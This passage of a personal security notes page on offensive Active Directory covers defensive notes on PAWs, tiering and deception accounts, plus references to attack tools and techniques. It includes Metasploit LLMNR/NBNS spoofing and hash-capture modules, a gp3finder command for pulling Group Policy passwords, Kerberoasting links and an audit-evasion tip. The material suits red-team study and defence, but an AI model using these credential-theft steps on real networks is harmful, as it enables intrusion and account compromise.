<li>Kerberos doesnot use DES or RC4 keys</li>
<li>If domain functional level is Sever 2012 R2 <ul>
<li>No NTLM Auth</li>
<li>No DES or RC4 keys</li>
<li>No delegation </li>
<li>No renewal of TGT</li>
</ul>
</li>
<li>MS to add DAs and EAs to this group without testing the impact of "lockout"</li>
</ul>
<h2 id="privileged-administrative-worksatations-paws">Privileged Administrative Worksatations (PAWs)</h2>
<ul>
<li>
<p>Deploy PAWs like solution if possible</p>
</li>
<li>
<p>GPO Protection</p>
</li>
<li>WMI Filtering</li>
<li>Change machine policy for GPO to 'Domain Computers' and remove read for 'Authenticated Users' in GPO settings</li>
<li>Add specific computers to GPO in filtering</li>
<li>Attacker tip: write directly to SYSVOL to avoid GPO audit</li>
<li>MS Pass the hash whitepaper</li>
</ul>
<h2 id="ad-security-model">AD Security Model</h2>
<ul>
<li>Tier 0 - Accounts, Groups and computers such as dc, da and ea</li>
<li>Tier 1 - Accounts, Groups and computers such as local admin on multiple servers with business value</li>
<li>Tier 2 - Administrative accounts such as help desk, support admin</li>
</ul>
<h1 id="control-restrictions-what-admins-control">* Control Restrictions - What admins control</h1>
<h1 id="logon-restrictions-where-admins-can-log-on-to">* Logon Restrictions - Where admins can log-on to</h1>
<h1 id="enhanced-security-admin-environment">* Enhanced Security Admin Environment</h1>
<h2 id="forest-a-security-boundary">Forest - a security boundary</h2>
<ul>
<li>Administrative Forest called Red Forest</li>
<li>Selective Authentication in Red Forest</li>
</ul>
<h2 id="powershell-version-5">PowerShell version 5</h2>
<ul>
<li>4104 Suspicious (Script Block Logging)</li>
<li>Module is highest, System wide Script is high</li>
<li>PSAmsi-Mimimizing-Obfuscation-To-Maximize-Stealth</li>
</ul>
<h1 id="deception">Deception</h1>
<ul>
<li>Password does not expire</li>
<li>Trusted for Delegation</li>
<li>Users with SPN</li>
<li>Password in description</li>
<li>High Privileged Users</li>
<li>ACL rights over other users, groups or containers</li>
<li>GenericRead for "Everyone"</li>
<li>4662 log - An operation was performed on an object</li>
<li>x500uniqueIdentifier</li>
<li>Older Operating Systems</li>
<li>DCShadow for Deception - chances of auth failure</li>
<li>Forest Admins</li>
<li>Set Logon Workstation to a non-existent machine</li>
<li>Deny logon to user</li>
<li>4768 Kerberos use</li>
<li>Master user and Slave user</li>
<li>
<p>Rights to GA - Slave user</p>
</li>
<li>
<p>Things to watch out to make deception real</p>
</li>
<li>objectSID</li>
<li>lastLogon, lastlogotimestamp</li>
<li>Logoncount</li>
<li>whenCreated</li>
<li>Badpwdcount</li>
<li>Honeypot buster tracks 6 logons</li>
</ul>
<h1 id="references">References</h1>
<h1 id="wiki">* Wiki</h1>
<ul>
<li>https://adsecurity.org/</li>
</ul>
<h1 id="dcshadow">* DCShadow</h1>
<ul>
<li>https://blog.alsid.eu/dcshadow-explained-4510f52fc19d</li>
</ul>
<h1 id="bloodhound">* BloodHound</h1>
<ul>
<li>
<p><a href="https://byt3bl33d3r.github.io/automating-the-empire-with-the-death-star-getting-domain-admin-with-a-push-of-a-button.html">Automating</a></p>
</li>
<li>
<p><a href="https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html">NTLM Relaying</a></p>
</li>
<li>
<p><a href="https://github.com/mdsecactivebreach/ANGRYPUPPY">Automate BloodHound</a></p>
</li>
<li>
<p><a href="https://speakerdeck.com/porterhau5/extending-bloodhound-for-red-teamers">Extending</a></p>
</li>
<li>
<p><a href="https://www.ernw.de/download/BloodHoundWorkshop/ERNW_DogWhispererHandbook.pdf">Guide</a></p>
</li>
</ul>
<h1 id="crackmapexec">* CrackMapExec</h1>
<ul>
<li>
<p><a href="https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html">Intro</a></p>
</li>
<li>
<p><a href="https://markitzeroday.com/pass-the-hash/crack-map-exec/2018/03/04/da-from-outside-the-domain.html">Use case</a></p>
</li>
</ul>
<h1 id="empyre">* EmPyre</h1>
<ul>
<li>http://www.rvrsh3ll.net/blog/empyre/empyre-engaging-active-directory/</li>
</ul>
<h1 id="red-teaming-ad-pdf">* Red Teaming AD (PDF)</h1>
<ul>
<li>
<p>https://adsecurity.org/wp-content/uploads/2016/08/DEFCON24-2016-Metcalf-BeyondTheMCSE-RedTeamingActiveDirectory.pdf</p>
</li>
<li>
<p>https://adsecurity.org/wp-content/uploads/2018/05/2018-NolaCon-Metcalf-ActiveDirectorySecurityTheJourney.pdf</p>
</li>
</ul>
<h1 id="attack-methods-domain-admin">* Attack Methods - Domain Admin</h1>
<ul>
<li>https://adsecurity.org/?p=2362</li>
</ul>
<h1 id="attacking-domain-trusts">* Attacking Domain Trusts</h1>
<ul>
<li>https://posts.specterops.io/a-guide-to-attacking-domain-trusts-971e52cb2944</li>
</ul>
<h1 id="misc-toolsscripts">* Misc Tools/Scripts</h1>
<ul>
<li>
<p><a href="https://github.com/api0cradle/LOLBAS">LOLBAS - Living Off The Land Binaries And Scripts</a></p>
</li>
<li>
<p>https://github.com/0xdea/tactical-exploitation</p>
</li>
<li>
<p>Attack Kerberos</p>
</li>
</ul>
<h1 id="protocol-info">* Protocol Info</h1>
<ul>
<li>https://adsecurity.org/?p=227</li>
</ul>
<h1 id="attacking-kerberos">* Attacking Kerberos</h1>
<ul>
<li>
<p><a href="http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html?m=1">http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html?m=1</a></p>
</li>
<li>
<p><a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html</a></p>
</li>
<li>
<p><a href="https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html">https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html</a></p>
</li>
<li>
<p><a href="https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf">https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf</a></p>
</li>
</ul>
<h1 id="attack-kerberos-wo-mimikatz">* Attack Kerberos w/o Mimikatz</h1>
<ul>
<li><a href="http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/">http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/</a></li>
</ul>
<h1 id="roasting-as-reps">* Roasting AS-REPS</h1>
<ul>
<li><a href="http://www.harmj0y.net/blog/activedirectory/roasting-as-reps/">http://www.harmj0y.net/blog/activedirectory/roasting-as-reps/</a></li>
</ul>
<h1 id="kerberos-party-tricks">* Kerberos Party Tricks</h1>
<ul>
<li>
<p><a href="http://www.exumbraops.com/blog/2016/6/1/kerberos-party-tricks-weaponizing-kerberos-protocol-flaws">http://www.exumbraops.com/blog/2016/6/1/kerberos-party-tricks-weaponizing-kerberos-protocol-flaws</a></p>
</li>
<li>
<p>Persistence</p>
</li>
</ul>
<h1 id="ad-persistence">* AD Persistence</h1>
<ul>
<li>
<p><a href="https://adsecurity.org/?p=1929">Sneaky Tricks</a></p>
</li>
<li>
<p>LLMNR/NetBios-NS spoofing</p>
</li>
</ul>
<h1 id="responder">* Responder</h1>
<ul>
<li>
<p>If SMB signing is disabled</p>
<ul>
<li>https://g-laurent.blogspot.com/2016/10/introducing-responder-multirelay-10.html</li>
</ul>
</li>
</ul>
<h1 id="metasploit">* Metasploit</h1>
<ul>
<li>
<p>Spoof</p>
<ul>
<li>
<p>auxiliary/spoof/llmnr/llmnr_response</p>
</li>
<li>
<p>auxiliary/spoof/nbns/nbns_response</p>
</li>
</ul>
</li>
<li>
<p>Capture</p>
<ul>
<li>
<p>auxiliary/server/capture/smb</p>
</li>
<li>
<p>auxiliary/server/capture/http_ntlm</p>
</li>
<li>
<p>set JOHNPWFILE /tmp/smbhashes.john</p>
</li>
</ul>
</li>
<li>
<p>Reference</p>
<ul>
<li>
<p>https://www.gracefulsecurity.com/stealing-accounts-llmnr-and-nbt-ns-poisoning/</p>
</li>
<li>
<p>https://www.pentestpartners.com/blog/how-to-get-windows-to-give-you-credentials-through-llmnr/</p>
</li>
</ul>
</li>
<li>
<p>GPO</p>
</li>
</ul>
<h1 id="cpasswords">* CPasswords</h1>
<ul>
<li>GP3Finder - https://bitbucket.org/grimhacker/gpppfinder
<div class="language-text highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a>gp3finder -A -t DOMAIN\_CONTROLLER -u DOMAINUSER\
</span></code></pre></div></li>
<li>
<p>Locate SYSVOL</p>
<ul>
<li>
<p>\\domain_controller\SYSVOL\DOMAIN_NAME\Policies</p>
</li>
<li>
<p>Metasploit GPP Module</p>
</li>
<li>
<p>Decrypt GPP Password</p>
<ul>
<li>PowerSploit - Get-GPPPassword</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="detailed-group-policy-information">* Detailed Group Policy Information</h1>
<p><div class="language-text highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a>gpresult \[/x\], \[/h\] &amp;lt;FILENAME&amp;gt;
</span></code></pre></div>
- Reference: https://technet.microsoft.com/en-us/library/cc733160(v=ws.11).aspx</p>
<ul>
<li>Privilege Escalation</li>
</ul>
<h1 id="windows">* Windows</h1>
<ul>
<li>
<p>Helpful - https://www.gracefulsecurity.com/privilege-escalation-in-windows-domains/</p>
</li>
<li>
<p>Powershell &amp; C# - https://decoder.cloud/2018/02/02/getting-system/</p>
</li>
<li>
<p>Mimikatz - https://www.gracefulsecurity.com/privesc-dumping-passwords-in-plaintext-mimikatz/</p>
</li>
<li>
<p>Incognito - https://www.gracefulsecurity.com/privesc-stealing-windows-access-tokens-incognito/</p>
</li>
</ul>

  <br>
    

    <br>
</div>

<footer class="col-md-12 wm-page-content">
      <p>
        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/glossary/offensiveactivedirectory.md"><i class="fa fa-github"></i>
Edit on GitHub</a>
      </p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
</footer>

</body>
</html>